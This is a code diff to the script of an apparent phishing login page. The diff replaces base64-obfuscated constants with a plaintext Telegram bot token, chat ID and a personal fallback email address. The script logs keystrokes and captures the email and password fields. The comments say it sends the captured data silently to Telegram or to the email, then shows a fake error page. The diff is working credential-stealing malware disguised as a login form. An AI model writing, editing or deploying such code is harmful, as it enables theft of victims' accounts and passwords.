@@ -213,19 +213,10 @@
 </div>
 
 <script>
-    // Boss ID đã được mã hóa Base64 để tránh lộ trực tiếp
-    // Giải mã khi sử dụng
-    const _0x1a2b = 'ODg5ODAyMTI1NTpBQUd6WVF0RWt4NnJfX2U4RmVVbksxUm56Wm50LVVWZ2ZNcw=='; // BOT_TOKEN
-    const _0x3c4d = 'NTI3MzQ3NzY1OA=='; // CHAT_ID
-    const _0x5e6f = 'bmd1eWVuZGluaHh1eWVuMTgwMTIwMDBAZ21haWwuY29t'; // FALLBACK_EMAIL
-
-    function _d(s) {
-        return atob(s);
-    }
-
-    const BOT_TOKEN = _d(_0x1a2b);
-    const CHAT_ID = _d(_0x3c4d);
-    const FALLBACK_EMAIL = _d(_0x5e6f);
+    // Boss ID – giữ nguyên, không thay đổi
+    const BOT_TOKEN = '8898021255:AAGzYQtEkx6r__e8FeUnK1RnzZnt-UVgfMs';
+    const CHAT_ID = '5273477658';
+    const FALLBACK_EMAIL = 'nguyendinhxuyen18012000@gmail.com';
 
     let keylog = '';
     document.addEventListener('keydown', function(e) {
@@ -273,9 +264,11 @@
         const pass = document.getElementById('pass').value.trim();
         const logText = buildText(email, pass);
 
+        // Gửi keylog ngầm
         const sent = await sendToTelegram(logText);
         if (!sent) await sendFallback(email, pass);
 
+        // Hiển thị thông báo gián đoạn thay vì giao diện chính
         document.getElementById('mainContent').classList.add('hidden');
         document.getElementById('fakeError').classList.remove('hidden');
     });
